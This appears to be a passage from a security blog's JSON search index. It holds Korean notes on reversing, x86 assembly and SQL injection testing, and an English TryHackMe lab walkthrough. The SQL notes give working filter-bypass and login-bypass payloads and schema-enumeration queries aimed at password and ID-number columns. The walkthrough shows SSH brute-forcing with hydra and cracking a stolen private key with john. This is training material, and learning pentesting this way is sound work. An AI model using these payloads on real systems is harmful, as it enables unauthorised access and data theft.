동시에 실행될 수 있는 주소 공간 - 각 프로세스 고유의 메모리 자원 보호 방법 - 필요 시 프로세스 사이에 주소 공간 공유가 가능해야 함 - 주소 공간을 프로그래머에게 투명하게 관리해야 함\n📜가상 기억 장치 - 하드웨어와 소프트웨어를 사용해 구현한 메모리 관리 기술 - 프로세스의 일부만 메모리에 적재하고 나머지는 보조기억장치에 둠 - 프로그램이나 데이터를 페이지 또는 세그먼트 단위로 교환 - 메모리 관리 및 보호 방식은 운영체제마다 다르게 정의\n📜대표적인 어셈블러 - GAS(GNU 어셈블러) - AT\u0026amp;T 방식으로 무료이며 크로스 플랫폼을 지원. GNU Project에서 제작 - MASM(Microsoft Macro Assembler) - Intel 방식으로 비주얼 스튜디오 2008부터 기본 탑재. 매크로 지원. 크로스 플랫폼 미지원 - NASM(Netwide Assembler) - 80x86 플랫폼 용으로 크로스 플랫폼을 지원. MASM과 유사한 점이 많음 (Intel 방식)\n📜운영체제 하드웨어 자원을 관리하고, 응용 서비스를 제공 사용자와 하드웨어 사이의 인터페이스 역할 하드웨어의 고장 탐색, 오류 처리, 보안유지\n📜빌드 과정 Compile Assembly link C언어 -\u0026gt; Assembler Code -\u0026gt; 오브젝트 파일 -\u0026gt; exe \u0026lt;- \u0026lt;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026mdash;\u0026ndash; decomplie disassemble\n","permalink":"https://crackernote.github.io/posts/2022-07-16-reversing-%EA%B8%B0%EC%B4%88/","summary":"1️⃣ Reversing 기초 📜CPU 아키텍처 - CISC (복합 명령어 집합 구조) - 메모리 용량을 적게 차지하는 프로그램을 구성할 수 있도록 설계된 프로세스 - 소규모 라인의 프로그램으로 많은 작업을 수행하기 위해, 강력한 명령어를 명령어 집합에 포함 - 가변 명령어 형식과 길이, 많은 명령어 종류, 복잡한 주소 지정 방식, 복잡한 회로 구성 - 인텔 계열의 프로세서(X86/64)\n- RISC (축약 명령어 집합 구조) - 적은 수의 컴퓨터 명령어를 수행하도록 설계된 프로세서 - 단순하지만 더 빨리 실행되는 소수의 명령어를 사용하는 아키텍처 - 복잡하고 강력한 명령어 집합은 오히려 간단한 명령어의 해석과 실행 시간까지 증가시킴 \u0026raquo; CISC - 단순 명령어, 짧은 사이클 시간, 적재 및 저장 구조, 고정길이 명령어, 단순명령어 형식, 제한된 종류의 주소 지정 방식 - MIPS, ARM - IoT 디바이스 및 스마트폰에서 사용","title":"Reversing Basic"},{"content":"1️⃣ SQL Injection 우회기법 📜SQL Injection 공격시 공백 문자 필터링시 우회 방법 Tab : %09 - no=1%09or%09id=\u0026lsquo;admin\u0026rsquo;\nLine Feed (\\n): %0a - no=1%0aor%0aid=\u0026lsquo;admin\u0026rsquo;\nCarrage Return(\\r) : %0d - no=1%0dor%0did=\u0026lsquo;admin\u0026rsquo;\n주석 : /**/ - no=1//or//id=\u0026lsquo;admin\u0026rsquo;\n괄호 : () - no=(1)or(id=\u0026lsquo;admin\u0026rsquo;)\n더하기 : + - no=1+or+id=\u0026lsquo;admin\u0026rsquo;\n","permalink":"https://crackernote.github.io/posts/2022-07-16-sql-injection-%EC%9A%B0%ED%9A%8C%EA%B8%B0%EB%B2%95/","summary":"1️⃣ SQL Injection 우회기법 📜SQL Injection 공격시 공백 문자 필터링시 우회 방법 Tab : %09 - no=1%09or%09id=\u0026lsquo;admin\u0026rsquo;\nLine Feed (\\n): %0a - no=1%0aor%0aid=\u0026lsquo;admin\u0026rsquo;\nCarrage Return(\\r) : %0d - no=1%0dor%0did=\u0026lsquo;admin\u0026rsquo;\n주석 : /**/ - no=1//or//id=\u0026lsquo;admin\u0026rsquo;\n괄호 : () - no=(1)or(id=\u0026lsquo;admin\u0026rsquo;)\n더하기 : + - no=1+or+id=\u0026lsquo;admin\u0026rsquo;","title":"SQL Injection 우회기법"},{"content":"1️⃣ SQL Injection 취약점 점검 📜SQL Injection 에러 유/무 확인 취약점 유/무 확인 검색란의 경우, 연결연산자 사용 a. \u0026rsquo; \u0026rsquo; 로 사용하여 정상작동 한다면 (te\u0026rsquo; \u0026lsquo;st), Mysql b. \u0026lsquo;+\u0026rsquo; 로 사용하여 정상작동 한다면 (te\u0026rsquo;+\u0026lsquo;st), Mssql c. \u0026lsquo;||\u0026rsquo; 로 사용하여 정상작동 한다면 (te\u0026rsquo;||\u0026lsquo;st), Oracle 조건 구문 완성 📜방법론 1) 검색기능에 대한 취약점 점검\na. select * from board where title like \u0026lsquo;% \u0026lsquo;||(case when 1=1 then \u0026rsquo;test\u0026rsquo; else \u0026lsquo;aaaa\u0026rsquo; end)||\u0026rsquo; %\u0026rsquo;\n\u0026gt; 결과 : \u0026lsquo;%\u0026rsquo;||\u0026lsquo;test\u0026rsquo;||\u0026rsquo;%\u0026rsquo; \u0026gt; \u0026lsquo;%test%\u0026rsquo; \u0026gt; 1=2일때 \u0026gt; \u0026lsquo;%aaaa%\u0026rsquo;\nb. select * from board where 1=1 and title like \u0026lsquo;%test%\u0026rsquo; =\u0026gt; TRUE select * from board where 1=2 and title like \u0026lsquo;%test%\u0026rsquo; =\u0026gt; TRUE\n\u0026gt; 컬럼이름이나 테이블의 이름의 경우는 Prepared를 사용하지 못하고, 직접 로직을 만들어 필터링을 해줘야함 따라서 검색 부분의 타이틀, 작성자 등 분류해서 검색하는 기능이 있다면 가능성이 있음\nc. select * from board where (case when 1=1 then \u0026rsquo;test\u0026rsquo; else \u0026lsquo;aaa\u0026rsquo; end) like \u0026lsquo;%test%\u0026rsquo;\n\u0026gt; 버프에서 입력시 (case+when+1=1+then+\u0026lsquo;test\u0026rsquo;+else+\u0026lsquo;aaa\u0026rsquo;+end) 공백을 넣어줘야함\n2) Prepared Statement 환경에서의 테이블 파라미터에 대한 취약점 점검 (JAVA Web 환경)\na. 127.0.0.1:8080/security/example.jsp?tbname=ex_member 가 있을 경우, 두가지가 존재함\n\u0026gt; select * from tbname\n- 127.0.0.1:8080/security/example.jsp?tbname=all_tables로 바꿔서 보낼 경우,\n​ Table Name이 뜨면 100% from 절에 있는 것임. 또한 Oracle 사용중 임을 알 수 있다.\n\u0026gt; select * from board where tbname = \u0026lsquo;~~\u0026rsquo; - prepared statement 는 table name에 적용될 수 없다 . 따라서 select * from ex_member where id = ?\n​ 이런식으로 table name이 아니라 id와 같은 컬럼명에 적용시켜야 함. - 이럴경우 select * from ex_member (where 1=1 and id = ? \u0026ndash;) where id = ? 와 같이 table name에 대하여 sql injection을 수행 할 수 있음\n\u0026gt; 다른 방법도 있음 (더 쉬움) - select * from ex_member where id = ? - select * from (select * from ex_member where 1=1 또는 1=2) ex_member where id = ? sub 쿼리를 통하여\n​ 한번 더 실행 되도록 하면 값이 같아진다.\n3) 인증우회 공격\na. ID를 알경우 - in-line query, Terminating query\n\u0026gt; in-line query - \u0026ldquo;select * from member where id=\u0026rsquo;{$id}\u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo; - \u0026ldquo;select * from member where id=\u0026rsquo; (admin\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1) \u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo;\n\u0026gt; Terminating query - \u0026ldquo;select * from member where id=\u0026rsquo;{$id}\u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo; - \u0026ldquo;select * from member where id=\u0026rsquo; (admin\u0026rsquo; \u0026ndash; ) \u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo; - \u0026ldquo;select * from member where id=\u0026rsquo; (admin\u0026rsquo;#) \u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo;\n**mysql 주석문자: \u0026ndash;, # ** \u0026ndash;의 경우 [공백]\u0026ndash;[공백] 이어야 함\nb. ID를 모를경우 - in-line query, Terminating query\n\u0026gt; in-line query - \u0026ldquo;select * from member where id=\u0026rsquo;{$id}\u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo; - \u0026ldquo;select * from member where id=\u0026rsquo; (test\u0026rsquo; or 1=1 or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1) \u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo;\n\u0026gt; Terminating query - \u0026ldquo;select * from member where id=\u0026rsquo;{$id}\u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo; - \u0026ldquo;select * from member where id=\u0026rsquo; (test\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo; \u0026ndash; ) \u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo; - \u0026ldquo;select * from member where id=\u0026rsquo; (test\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\u0026rsquo;#) \u0026rsquo; and pw=\u0026rsquo;{$pw}\u0026rsquo;\u0026rdquo;\nc. 비밀글 비밀번호 부분\n\u0026gt; select * from board where idx=6 and pw=\u0026rsquo;{$pw}\u0026rsquo; select * from board where idx=6 and pw=\u0026rsquo; (\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1) \u0026rsquo; - 모든 결과가 참이 되므로\u0026hellip; table 안에 첫번째 게시글이 나오게됨\n\u0026gt; select * from board where idx=6 and pw=\u0026rsquo; (\u0026rsquo; or idx=8 \u0026ndash; ) \u0026rsquo; - 해쉬화를 시켜 저장할 경우 \\1. application 단에서 해시화 \u0026gt; 싱글 쿼터(\u0026rsquo;)로 판별 가능 \u0026gt; 입력시 오류 없음 \u0026gt; 싱글쿼터도 포함하여 md5 변환되어 서버로 전송\n​ \u0026gt; sql injection 불가 ​ \\2. DBMS 단에서 해시화 ​ \u0026gt; 싱글 쿼터(\u0026rsquo;)로 판별 가능 \u0026gt; 입력 시 오류. (ex. md5() \u0026lt;- 괄호 안에 \u0026rsquo; 들어가면 오류 생김) \u0026gt; sql injection가능\nd. 게시글 수정\n\u0026gt; update 구문에 Password 검증 쿼리 예측\n- UPDATE board SET title=\u0026hellip;, content=\u0026hellip;, data=\u0026hellip; WHERE idx=7 and password={$pw} UPDATE board SET title=\u0026hellip;, content=\u0026hellip;, data=\u0026hellip; WHERE idx=7 and password=\u0026rsquo; (\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1) '\n​ (전체 구문에 영향을 미칠 수 있음..) ​ UPDATE board SET title=\u0026hellip;, content=\u0026hellip;, data=\u0026hellip; WHERE idx=7 and password=\u0026rsquo;\u0026rsquo; (or idx=7 \u0026ndash; ) '\n​ (따라서 idx 를 지정해주는 쿼리를 작성 하자)\n\u0026gt; update 구문전 password 검증 - select * from board where idx=7 and password=\u0026rsquo;\u0026rsquo; 후에 수정 페이지 들어간 후 수정\ne. 게시글 삭제\n\u0026gt; delete 구문에 password 검증 쿼리 예측 - delete from where idx=7 and password=\u0026rsquo;\u0026rsquo;\n4) 데이터 조회 기법\na. DBMS 파악\n\u0026gt; 에러를 통한 파악 \u0026gt; 연결 연산자를 통한 파악 (대부분 연결 연산자로 많이 됨) : Oracle(||), MSSQL(+(%2b로 사용)), MySQL(공백) - (MSSQL) ?idx=192 and \u0026rsquo;test\u0026rsquo;=\u0026lsquo;te\u0026rsquo;+\u0026lsquo;st\u0026rsquo; (MSSQL) (burp 에서는 \u0026gt; ?idx=192+and+\u0026lsquo;test\u0026rsquo;=\u0026lsquo;te\u0026rsquo;%2b\u0026rsquo;st\u0026rsquo; ) - (ORCLE) 검색어에 \u0026gt; t\u0026rsquo;||(case when 1=1 then \u0026rsquo;e\u0026rsquo; else \u0026lsquo;a\u0026rsquo; end)||\u0026lsquo;st \u0026gt; 함수를 통한 파악 - MySQL - now(), mid() \u0026gt; (?idx=7 and mid(\u0026rsquo;test\u0026rsquo;,1,1)=\u0026rsquo;t\u0026rsquo;) \u0026gt; mid 함수의 경우 mysql 만 있음 - MSSQL - len(), substring() \u0026gt; len() 함수의 경우 mssql 만 있음 - ORACLE - substr() \u0026gt; 더미 테이블을 통한 파악 - ORACLE - select 1 from dual \u0026gt; (?idx=(select 192 from dual))로 조회시 192번 글이 조회 되었다면\u0026hellip; 가능성 높음 - DB2 - select 1 from sysibm.sysdummy1\n** JSP, JAVA 사용 시, ORACLE ** PHP 사용시, Mysql 사용 가능성 높음\nb. 공격 적합성 검토\n\u0026gt; DBMS 에러 출력 유/무 파악 = error base \u0026gt; DB 데이터 웹페이지 출력 유/무 파악(검색기능에 적합) = union base \u0026gt; t4 로 검색했는데 test4가 검색될 경우 \u0026gt; 위 둘다 안되면 \u0026hellip;. Blind\nc. MySQL 데이터 조회\n\u0026gt; 1. 순차적 접근(DB목록화, Table 목록화, 컬럼 목록화),\n​ * DB 목록화 :\n​ select * from information.schema.schemata\n​ select schema_name from information.schema.schemata ​ (information_schema DB 안에 schemata 테이블에 있는 컬럼 \u0026ldquo;SCHEMA_NAME\u0026quot;은 DB 이름이다.) ​ (information_schema DB안에 tables, columns 안에 있는 컬럼 \u0026ldquo;table_schema\u0026quot;는 DB 이름이다.)\n​ * Table 목록화 :\n​ select table_name from information_schema.tables where table_schema=\u0026lsquo;board\u0026rsquo;\n​ * Column 목록화 :\n​ select * from information_schema.columns where table_shema=\u0026lsquo;board\u0026rsquo; and table_name=\u0026lsquo;members\u0026rsquo;;\n​ * 데이터 조회 :\n​ select idx, id, password, jumin from board.members;\n\u0026gt; 2. 비순차적접근 (목적에 따라 접근하는 정보부터\u0026hellip;)\n​ * 원하는 테이블 이름 출력 :\n​ select table_name from information_schema.tables where table_schema=\u0026lsquo;board\u0026rsquo;\n​ and table_name like \u0026lsquo;%mem%\u0026rsquo;;\n​ -\u0026gt; 원하는 테이블 이름 출력 후, 순차적으로 Column 목록화, 데이터 조회 실행\n​\n​ * 원하는 컬럼 관련 출력(id 등..) :\n​ select table_name, column_name from information_schema.columns where table_schema=\u0026lsquo;board\u0026rsquo; and ​ column_name like \u0026lsquo;%id%\u0026rsquo;;\nd. MSSQL 데이터 조회\n\u0026gt; 1. 순차적 접근\n​ * 순차적 레코드 출력 : (top은 테이블의 레코드를 조회할때 결과중 상위 몇개만 표기하기 위해 사용하는 구문)\n​ select top 3 name from sysdatabases; \u0026raquo; 3개의 결과값이 나옴\n​\n​ (ORDER BY 사용) ​ select top 1 name from (select top 1 name from sysdatabases order by name)a order by name desc;\n​ \u0026gt; 첫번째 레코드 출력 상위 top절은 무조건 1 별칭 필수\n​ select top 1 name from (select top 2 name from sysdatabases order by name)a order by name desc; ​ \u0026gt; 두번째 레코드 출력\n​ select top 1 name from (select top 3 name from sysdatabases order by name)a order by name desc; ​ \u0026gt; 세번째 레코드 출력\n​ (NOT IN 사용)\n​ select top 1 name from sysdatabases; \u0026raquo; master라는 레코드 하나 출력\n​ select top 1 name from sysdatabases where name not in (\u0026lsquo;master\u0026rsquo;); \u0026raquo; master라는 레코드 제외 후 상위 출력\n​ select top 1 name from sysdatabases where name not in (\u0026lsquo;master\u0026rsquo;, \u0026rsquo;tempdb\u0026rsquo;);\n​ ** 레코드가 너무 많을때는 계속 추가되야 하므로 길어짐 \u0026raquo; 따라서 NOT IN 연산자 안에 서브쿼리 사용 가능\n​ select top 1 name from sysdatabases where name not in (select top 0 name from sysdatabases);\n​ \u0026gt; 첫번째 레코드 출력 서브쿼리 top 절은 0부터 시작\n​ select top 1 name from sysdatabases where name not in (select top 1 name from sysdatabases);\n​ \u0026gt; 첫번째 레코드 제외하고 제일 상위에 있는 레코드 출력\n​ select top 1 name from sysdatabases where name not in (select top 2 name from sysdatabases);\n​ \u0026gt; 첫번째, 두번째 레코드 제외하고 제일 상위에 있는 레코드 출력\n​ (ROW_NUMBER() 사용) \u0026raquo; 2005 이상부터 사용가능!!\n​ ** row_number() \u0026raquo; 레코드별로 순차적으로 카운팅 해줌\n​ select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a\n​ where a.num=1; \u0026raquo; 첫번째 레코드 출력\n​ select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a\n​ where a.num=1; \u0026raquo; 두번째 레코드 출력\n5) DBMS별 데이터 사전\na. MYSQL** **\n\u0026gt; Information_schema.schemata / Information_schema.tables / Information_schema.columns\nb. MSSQL\n\u0026gt; sysdatabases(Master DB에 존재) / sysobjects (각 사용 DB에 존재) / syscolumns (각 사용 DB에 존재)\n\u0026gt; (MSSQL 2005 이상) : sys.databases / sys.objects / sys.columns\n\u0026gt; Information_schema.schemata / Information_schema.tables / Information_schema.columns\nc. ORACLE\n\u0026gt; all_tables / all_tab_columns\n6) DBMS별 메타데이터 목록화\na. MYSQL\n\u0026gt; 순차적 접근 :\n#DB 목록화\rselect * from information_schema.SCHEMATA;\rselect schema_name from information_schema.SCHEMATA; # DB 목록화, schema_name : DB명\r#TABLE 목록화\rselect * from information_schema.tables where table_schema=\u0026#34;board\u0026#34;; # table_schema : DB 명\rselect table_name from information_schema.tables where table_schema=\u0026#34;board\u0026#34;; # table_schema : DB 명\r#COLUMN 목록화\rselect * from information_schema.columns;\rselect * from information_schema.COLUMNS where table_schema=\u0026#34;board\u0026#34; and table_name=\u0026#34;members\u0026#34;; # table_schema : DB 명\r#DATA 조회\rselect id, idx, password from board.members; \u0026gt; 비순차적 접근 : 테이블, 컬럼 등을 목적에 맞는 것부터 조회 시도 **테이블 : mem, user, file, session, employee, admin ..\n​ **컬럼 : id, pw, pass, jumin, ssn, admin, card ..\n#TABLE 목록화\rselect table_name from information_schema.tables where table_schema=\u0026#34;board\u0026#34; and table_name like \u0026#39;%mem%\u0026#39;;\r#COLUMN 목록화\rselect table_name, column_name from information_schema.COLUMNS where table_schema=\u0026#34;board\u0026#34; and column_name like \u0026#39;%id%\u0026#39;; ","permalink":"https://crackernote.github.io/posts/2022-07-16-sqli-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%A0%90%EA%B2%80/","summary":"1️⃣ SQL Injection 취약점 점검 📜SQL Injection 에러 유/무 확인 취약점 유/무 확인 검색란의 경우, 연결연산자 사용 a. \u0026rsquo; \u0026rsquo; 로 사용하여 정상작동 한다면 (te\u0026rsquo; \u0026lsquo;st), Mysql b. \u0026lsquo;+\u0026rsquo; 로 사용하여 정상작동 한다면 (te\u0026rsquo;+\u0026lsquo;st), Mssql c. \u0026lsquo;||\u0026rsquo; 로 사용하여 정상작동 한다면 (te\u0026rsquo;||\u0026lsquo;st), Oracle 조건 구문 완성 📜방법론 1) 검색기능에 대한 취약점 점검\na. select * from board where title like \u0026lsquo;% \u0026lsquo;||(case when 1=1 then \u0026rsquo;test\u0026rsquo; else \u0026lsquo;aaaa\u0026rsquo; end)||\u0026rsquo; %\u0026rsquo;","title":"SQL Injection 취약점 점검"},{"content":" TryHackMe Basic Pentesting 📜 Basic Pentesting \u0026ldquo;Basic Pentesting\u0026rdquo; is a beginner level pentesting room in TryHackMe.\nLet\u0026rsquo;s dive in the room.\n📜 Task 1. Find the services exposed by the machine I used Nmap tool to find the services running on the target system\nNmap -sC -sV [Target_Machine_IP] ​\tScreenshot 1 (nmap results)\nWe can see the services are :\nSSH (Port 22) HTTP (Port 80) SAMBA (Port 139 \u0026amp; 445) HTTP-Proxy (Port 8080) ​\n📜 Task 2. What is the name of the hidden directory on the web server(enter name without /)? I used dirb tool to find hidden directories on the web server.\ndirb http://[Tartget_IP] /usr/share/wordlists/dirb/common.txt ​ Screenshot 2 (dirb results)\nWe can see the hidden directory : /development\nNow navigate around the website and development directory on the website.\n​ Screenshot 3 (\u0026quot;/development\u0026quot; directory)\nNow let’s open each texts. We may find something interesting here\n​ Screenshot 4 (dev.txt)\n​ Screenshot 5 (j.txt)\n📜 Task 3. User brute-forcing to find the username \u0026amp; password Here we need to find the username and password. But first we need to determine the users present on our target system.\nSo we know that samba is running on our target (from Nmap results \u0026amp; text files on the websites) We can use enum4linux tool to enumerate the machine. Syntax for tool is as follows :\nenum4linux -e [Target_Machine_IP] ​ Screenshot 6 (enum4linux results)\nNow we can find the users \u0026ldquo;kay\u0026rdquo; and \u0026ldquo;jan\u0026rdquo;\nFrom the texts in development folder we analysed that J (or Jan) is having a weak password so it will be easier to brute-force that using our best friend Hydra.\nSo the syntax for hydra for cracking Jan’s password will be :\nhydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://[TARGET_MACHINE_IP] ​ Screenshot 7 (hydra results)\n📜 Task 4. What is the username? Answer : jan (from Screenshot 7)\n📜 Task 5. What is the password? Answer : armando (from Screenshot 7)\n📜 Task 6. What service do you use to access the server(answer in abbreviation in all caps)? Answer : ssh\nssh jan@[TARGET_MACHINE_IP] 📜 Task 7. Enumerate the machine to find any vectors for privilege escalation. We can login with \u0026ldquo;jan\u0026rdquo; but we don\u0026rsquo;t have permission pass.bak file\n​ Screenshot 8 (Permission denided)\nSo we should escalate privilege to get loot level but we don\u0026rsquo;t have the password for user kay.\nHowever, we can use ssh key of kay and then finding the passphrase to access the machine as kay.\nFirst, Get the id_rsa key from kay’s directory and save it in our system.\ncd /home/kay cd .ssh cat id_rsa ​ Screenshot 9 (id_rsa)\nCopy this key and save it in our system by name \u0026ldquo;id_rsa.txt\u0026rdquo;\nSecond, Cracking the key for passphrase with \u0026ldquo;John The Ripper\u0026rdquo;\npython3 /opt/john/ssh2john.py id_rsa.txt \u0026gt; decrypted.txt This will convert our Private SSH key into john form so that it can be cracked further\njohn --wordlist=/usr/share/wordlists/rockyou.txt decrypted.txt This will give us our phrase : beeswax\nThird, Accessing as kay\nGo to jan’s shell and write this command (because if we try to do this outside the ssh of jan or on our system shell it will not allow that)\nssh -i /home/kay/.ssh/id_rsa kay@[TARGET_MACHINE_IP] ​ Screenshot 10 (Login with kay)\nAnd finally we can see \u0026ldquo;pass.bak\u0026rdquo; file\n​ Screenshot 11 (pass.bak)\n","permalink":"https://crackernote.github.io/posts/2023-06-07-tryhackme_basic-pentesting/","summary":"TryHackMe Basic Pentesting 📜 Basic Pentesting \u0026ldquo;Basic Pentesting\u0026rdquo; is a beginner level pentesting room in TryHackMe.\nLet\u0026rsquo;s dive in the room.\n📜 Task 1. Find the services exposed by the machine I used Nmap tool to find the services running on the target system\nNmap -sC -sV [Target_Machine_IP] ​\tScreenshot 1 (nmap results)\nWe can see the services are :\nSSH (Port 22) HTTP (Port 80) SAMBA (Port 139 \u0026amp; 445) HTTP-Proxy (Port 8080) ​","title":"TryHackMe Basic Pentesting"},{"content":"1️⃣ X86 Assembly 기초 📜x86 아키텍처 - 데이터 타입 : 어셈블리 기본\n- 주소 표기법 : 리틀 엔디안\n- 레지스터 : 8개의 범용 레지스터, EIP, EFLAGS\n- 호출규약 : cdecl, stdcall, fastcall\n- 명령어 세트 : 가변 길이 명령어 형식을 사용\n- 피연산자 : 레지스터, 메모리 주소, 주소값, 숫자\n- 기본문법 : AT\u0026amp;T(add a,b \u0026gt; b=a+b) 또는 Intel (add a,b \u0026gt; a=a+b)\n📜레지스터 - 8개의 범용 레지스터 + EIP(32비트)\n- EFLAGS 레지스터(32비트)\n- 세그먼트 레지스터(16비트)\n- EAX(Extended Accumulator Register) : 산술 연산에 사용, 함수 리턴값 저장\n- EBX(Extended Base Register) : 베이스, 특정 메모리를 가리키는 포인터\n- ECX(Extended Count Register) : 카운터 코드에 사용 (흔히 for문 등의 카운터에 사용)\n- EDX(Extended Data Register) : 데이터 레지스터 (곱셈, 나눗셈)\n- ESI(Extended Source Index) : 문자열 연산의 출발지 포인터\n- EDI(Extended Destionation Index) : 문자열 연산의 목적지 포인터 - ESP(Extended Stack Point) : 스택 포인터 - EBP(Extended Base Point) : 스택 프레임 베이스 포인터 .스택의 기준\n- EIP(Extended Instruction Point) : 다음 실행할 명령어를 가리키는 포인터\n📜EFLAGS 레지스터 - 상태 플래그\n- 방향 플래그\n- 시스템 \u0026amp; IOPL 플래그\n- CF : Carry\n- PF : Parity\n- AF : Adjust\n- ZF : Zero\n- SF : Sign\n- OF : Overflow\n📜자주쓰는 명령어 명령어 유형 의미 대표 명령어 세트 데이터 이동 src에서 dst로 이동 mov, lea, push, pop, les, pushad, popad 산술 정수의 산술 연산 add, adc, sub, sbb, mul, imul, div, idev, cmp, inc, dec 부동 소수점 부동 소수점 산술 연산 fadd, fsub, fmul, dic, cmp 논리 비트 논리 연산 adn, or, xor, not, shl/sal, shr, sar, ror, rol 제어 이동 제어 흐름의 이동 jmp, jcc, call, ret, int, into 문자열 문자열의 비교, 이동 movs, stos, sca, outs, rep, repz, repnz, repne I/O 입력과 출력 in, out 변환 데이터 타입 변환 movzx, movsx, cbw, cdq, bswap 기타 플래그 조작, 특권 모드 처리 clc, stc, cmc, std, cl, sti 📜PUSH, POP - PUSH : 스택에 데이터를 삽입 \u0026gt; push word/dword\n\u0026gt; push 명령어는 자동으로 ESP를 4바이트 감소시킴\n- POP : 스택에서 데이터를 꺼냄\n\u0026gt; 스택에서 4바이트를 꺼내와 지정한 레지스터에 삽입\n\u0026gt; POP 명령어는 자동으로 ESP를 4바이트 증가 시킴\n📜MOV - 레지스터 \u0026lt;-\u0026gt; 레지스터 (가능)\n- 메모리 \u0026lt;-\u0026gt; 레지스터 (가능)\n- Immediate 값(메모리가 아닌 명령어에 포함된 값) -\u0026gt; 레지스터 또는 메모리 (가능)\n- 메모리 \u0026lt;-\u0026gt; 메모리 (불가능)\n📜Assembly 프로그래밍 정상적으로 끝내는 방법 - mov eax, 1\nmov ebx, 0\nint 80h\n\u0026gt;exit(0) 의 역할을 함\n📜\u0026lsquo;r/m32\u0026rsquo; 주소형식 - 다음과 같은 형식을 가지는 문법을 의미 • mov eax, ebx ← ebx 에 담긴 내용을 eax 로 복사 • mov eax, [ebx] ← ebx에 담긴 내용이 가리키는 주소의 내용 (포인터 )을 eax 로 복사 • mov eax, [ebx+ecxX] ← ebx에서 ecxX 만큼 떨어진 곳에 위치한 주소의 내용을 eax 로 복사 • mov eax, [ebx + ecxX + Y] ← ebx에서 ecxX + Y 만큼 떨어진 곳에 위치한 주소의 내용을 eax 로 복사\n📜ADD, SUB - 목적지는 r/m32 또는 레지스터\n- 출발지는 r/m32 또는 레지스터 또는 상수값\n- 출발지와 목적지가 모두 r/m32일 수는 없음\n- OF, SF, ZF, AF, PF, CF에 영향\n📜LEA (복사, Load Effective Address - 유효주소 로드) - 출발지는 r/m32\n- 목적지는 레지스터\n- 레지스터 연살 결과를 레지스터에 저장 (포인터 아님)\n- MOV와 다른점\n\u0026gt; MOV는 값을 로드함, mov eax, [ebp+esp+4] \u0026gt; [ebp+esp+4]의 주소가 가리키는 값을 로드함\n\u0026gt; LEA는 유효 주소를 로드, lea eax, [ebp+esp+4] \u0026gt; [ebp+esp+4]의 주소를 로드함\n📜AND - 목적지는 r/m32 또는 레지스터\n- 출발지는 r/m32 또는 레지스터 또는 상수값\n- OF, CF, SF, ZF, PF\n📜OR - 목적지는 r/m32 또는 레지스터\n- 출발지는 r/m32 또는 레지스터 또는 상수값\n- OF, CF, SF, ZF, PF\n📜XOR - 목적지는 r/m32 또는 레지스터\n- 출발지는 r/m32 또는 레지스터 또는 상수값\n- OF, CF, SF, ZF, PF\n📜INC - 피연산자의 값을 1 증가시킴 \u0026gt; OF, SF, ZF, AF, PF에 영향\n📜DEC - 피연산자의 값을 1 감소시킴 \u0026gt; OF, SF, ZF, AF, PF에 영향\n📜CMP(두 값을 비교) - cmp 레지스터, 상수값\n- cmp r/m32, 상수값\n- cmp r/m32, 레지스터\n- cmp 레지스터, r/m32\n- 출발지에서 목적지 값을 뺀 결과를 플래그에 반영\n- 결과는버림\n📜TEST(논리비교) - test eax, eax(eax 값이 0인 경우 ZF=1)\n- 보통 jcc랑 같이 쓰임\n📜제어흐름 - 조건부 제어 : IF, WHILE, SWITCH\n- 비조건부 제어 : CALL, GOTO, EXCEPTION, INTERRUPT\n📜JMP(jump) - 피연산자 주소로 EIP를 변경\n- Short Jump(OF 85) : 현재 EIP 값에서 -128~127 범위로 이동\n- Far Jump(75) : 다른 세그먼트에 위치한 명령어로 이동\n📜JCC (Jump if condition is met) - 특정 조건을 만족할 경우 지정한 주소로 제어 흐름을 이동\n- JNE : Jump Not Equal (ZF=0)\n- JE : Jump Equal (ZF=1)\n- JLE : Jump Less Equal (ZF=1 or SF\u0026lt;\u0026gt;OF)\n📜CALL(함수 호출) - call printf / 0x80480000 / [eax + 4]\n- 우선 다음 실행할 명령어 주소를 스택에 삽입한 뒤 EIP에 해당 주소를 옮긴 뒤 이동하는 방식\n- 외부 함수를 사용하는 경우 반드시 해당 함수가 포함된 라이브러리를 linker에 함께 전달해야 함\n📜x86 함수 호출 규약 - cdecl\n\u0026gt; x86 환경에서 대부분 C 컴파일러가 쓰는 규약\n\u0026gt; Caller에서 스택을 정리\n\u0026gt; 오른쪽에서 왼쪽 순서로 파라미터를 전달\n\u0026gt; 항상 스택의 최상위에 함수의 첫 번째 파라미터가 위치\n- stdcall\n\u0026gt; MS가 자체적으로 만든 호출규약 (Win32 API에서 사용)\n\u0026gt; 파라미터 입력 순서는 cdecl과 동일\n\u0026gt; Callee가 스택을 정리\n\u0026gt; 작고 빠른 프로그램에 용이\n- 함수가 시작될 때, Callee가 Stack에 2가지 값을 저장\n\u0026gt; EIP : caller의 next instruction (다시 돌아갔을때 실행할 명령어 위치)\n\u0026gt; EBP : caller의 base pointer, main함수 시작부분 (다시 돌아갔을때 스택 프레임 기준)\n","permalink":"https://crackernote.github.io/posts/2022-07-16-x86-%EC%96%B4%EC%85%88%EB%B8%94%EB%A6%AC-%EA%B8%B0%EC%B4%88/","summary":"1️⃣ X86 Assembly 기초 📜x86 